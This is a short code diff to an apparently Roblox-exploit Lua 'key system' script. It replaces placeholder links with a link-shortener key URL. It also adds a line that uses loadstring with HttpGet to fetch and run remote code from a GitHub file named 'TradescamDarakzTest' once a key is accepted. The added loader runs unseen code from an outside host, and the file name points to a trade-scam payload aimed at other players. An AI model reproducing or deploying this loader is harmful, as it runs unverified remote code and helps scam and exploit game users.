@@ -74,7 +74,7 @@ end
 
 --// Copy link function
 GetKeyBtn.MouseButton1Click:Connect(function()
-    setclipboard("https://yourlink.com/getkey") -- ganti link ini
+    setclipboard("https://direct-link.net/1392937/3S2P6SxYEBgl") -- ganti link ini
     Notify("Link Copyed!!")
 end)
 
@@ -87,7 +87,7 @@ EnterKeyBtn.MouseButton1Click:Connect(function()
         Frame.Visible = false
         
         -- Auto Execute Script Utama
-        loadstring(game:HttpGet("https://yourlink.com/mainscript.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Darashad171/DarakzHub/refs/heads/main/TradescamDarakzTest"))()
     else
         Notify("Invalid Key ❌")
     end
